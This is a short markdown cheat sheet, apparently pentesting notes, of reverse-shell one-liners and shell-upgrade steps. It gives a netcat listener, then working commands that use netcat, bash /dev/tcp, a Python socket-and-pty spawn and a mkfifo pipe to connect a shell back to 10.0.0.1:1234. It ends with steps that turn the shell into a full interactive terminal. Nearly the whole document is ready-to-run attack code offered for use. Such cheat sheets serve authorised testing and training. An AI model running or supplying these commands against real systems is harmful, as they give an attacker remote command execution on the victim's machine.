---
title: Reverse shell
description: Reverse and interactive shell cheatsheet.
---

# Reverse shell

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

## Well-known reverse shells

```bash
# Listener
nc -lnvp 1234

# netcat
nc -e /bin/bash 10.0.0.1 1234

# bash
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1

# python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

# netcat (openbsd)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```


## Interative shell (upgrade your shell)

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

CTRL+Z
stty raw -echo; fg
```

```bash
# Particularly useful with Windows shells
rlwrap nc -lvnp <port>
```

```bash
# On our computer
$ stty -a
speed 38400 baud; rows 17; columns 240; line = 0;
[...]

# On the reverse shell
stty rows 17
stty cols 240
```